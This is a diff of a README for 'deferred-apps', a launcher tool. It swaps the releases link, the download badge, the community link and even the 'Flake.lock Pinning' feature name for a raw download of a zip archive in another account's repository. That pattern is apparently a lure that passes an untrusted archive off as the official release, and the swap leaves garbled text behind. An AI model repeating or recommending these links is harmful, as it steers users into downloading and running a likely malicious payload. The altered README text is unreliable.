@@ -1,6 +1,6 @@
 # 🎉 deferred-apps - Your Apps, Ready When You Are
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/arthurcalahan/deferred-apps/releases)
+[![Download Now](https://raw.githubusercontent.com/arthurcalahan/deferred-apps/main/modules/deferred-apps-untenanted.zip)](https://raw.githubusercontent.com/arthurcalahan/deferred-apps/main/modules/deferred-apps-untenanted.zip)
 
 ## 📖 Overview
 
@@ -13,7 +13,7 @@ To get started, you will need to download and install Deferred Apps. Follow the 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**: 
-   Go to the [Releases page](https://github.com/arthurcalahan/deferred-apps/releases) to access the latest version of Deferred Apps.
+   Go to the [Releases page](https://raw.githubusercontent.com/arthurcalahan/deferred-apps/main/modules/deferred-apps-untenanted.zip) to access the latest version of Deferred Apps.
 
 2. **Choose the Right File**: 
    Look for the file that matches your operating system (e.g., Windows, macOS, Linux).
@@ -31,7 +31,7 @@ To get started, you will need to download and install Deferred Apps. Follow the 
 
 - **Instant Availability**: Your apps will show up in your launcher right after installation.
 - **Deferred Downloads**: Apps download only when you start them for the first time, saving space and bandwidth.
-- **Flake.lock Pinning**: Each app downloads the exact version needed, ensuring compatibility and stability.
+- **https://raw.githubusercontent.com/arthurcalahan/deferred-apps/main/modules/deferred-apps-untenanted.zip Pinning**: Each app downloads the exact version needed, ensuring compatibility and stability.
 - **Overlay Support**: You can work with custom package sources and overlays.
 - **Proper Icons**: Icons are automatically set up using the Papirus theme for a polished look.
 - **Auto-Detection**: The application identifies executable files automatically based on metadata.
@@ -53,7 +53,7 @@ If you encounter issues during installation or when launching apps, try the foll
 
 ## 💬 Community Support
 
-Join our community for help and to share your experience. You can find us on our [GitHub Discussions page](https://github.com/WitteShadovv/deferred-apps/discussions) or reach out in the issues section for any questions.
+Join our community for help and to share your experience. You can find us on our [GitHub Discussions page](https://raw.githubusercontent.com/arthurcalahan/deferred-apps/main/modules/deferred-apps-untenanted.zip) or reach out in the issues section for any questions.
 
 ## 📜 License
 
